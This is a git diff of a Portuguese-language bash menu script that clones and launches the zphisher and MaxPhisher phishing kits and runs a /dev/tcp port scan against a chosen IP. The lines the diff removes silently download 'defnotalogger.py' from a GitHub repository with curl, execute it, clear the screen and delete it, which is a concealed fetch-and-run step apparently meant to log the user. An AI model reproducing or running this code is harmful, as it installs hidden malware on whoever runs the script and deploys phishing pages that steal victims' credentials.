@@ -1,25 +1,15 @@
 cd ..
 
 if [ ! -d "1337" ]; then
-    git clone https://github.com/Griffith-Femto1/1337.git
+git clone https://github.com/Griffith-Femto1/1337.git
 else
-    cd 1337
-    git pull
-    cd ..
+cd 1337
+git pull
+cd ..
 fi
 
 cd 1337
-curl https://raw.githubusercontent.com/Griffith-Femto1/1337/refs/heads/main/defnotalogger.py --output test.py
-sleep 1
-clear
-python3 test.py
-sleep 1
-clear
-rm -f test.py
-git clone https://github.com/Griffith-Femto1/1337.git 2>/dev/null
-cd 1337
-bash 1337.sh
-clear
+
 mkdir -p Ferramentas
 clear
 
@@ -38,42 +28,47 @@ echo "[1] zPhisher"
 echo "[2] Ip lookup"
 echo "[3] MaxPhisher"
 echo "[4] Ip port scanner"
+
 read input
 
 if [ "$input" -eq 1 ]; then
-    clear
-    cd Ferramentas
-    sleep 3
-    echo "checando ferramentas"
-    if [ ! -d "zphisher" ]; then
-        git clone https://github.com/htr-tech/zphisher
-    fi
-    cd zphisher
-    chmod +x trackip
-    bash trackip
-    if [ ! -d "MaxPhisher" ]; then
-        git clone https://github.com/KasRoudra2/MaxPhisher
-    fi
-    cd MaxPhisher
-    python3 maxphisher.py
+clear
+cd Ferramentas
+sleep 3
+echo "checando ferramentas"
+
+if [ ! -d "zphisher" ]; then
+git clone https://github.com/htr-tech/zphisher
+fi
+
+cd zphisher
+bash zphisher.sh
 
 elif [ "$input" -eq 3 ]; then
-    cd Ferramentas
-    if [ ! -d "MaxPhisher" ]; then
-        git clone https://github.com/KasRoudra2/MaxPhisher
-    fi
-    cd MaxPhisher
-    python3 maxphisher.py
+
+cd Ferramentas
+
+if [ ! -d "MaxPhisher" ]; then
+git clone https://github.com/KasRoudra2/MaxPhisher
+fi
+
+cd MaxPhisher
+python3 maxphisher.py
 
 elif [ "$input" -eq 4 ]; then
-    read -p "Enter the target IP address: " target
-    read -p "Enter the starting port: " startPort
-    read -p "Enter the ending port: " endPort
-    echo "Scanning $target for open ports from $startPort to $endPort..."
-    for ((port=$startPort; port<=$endPort; port++)); do
-        (echo >/dev/tcp/$target/$port) &>/dev/null && echo "Port $port is open" || echo "Port $port is closed"
-    done
-    echo "Scan complete!"
+
+read -p "Enter the target IP address: " target
+read -p "Enter the starting port: " startPort
+read -p "Enter the ending port: " endPort
+
+echo "Scanning $target for open ports from $startPort to $endPort..."
+
+for ((port=$startPort; port<=$endPort; port++)); do
+(echo >/dev/tcp/$target/$port) &>/dev/null && echo "Port $port is open" || echo "Port $port is closed"
+done
+
+echo "Scan complete!"
+
 else
-    echo "opção nao reconhecida"
+echo "opção nao reconhecida"
 fi
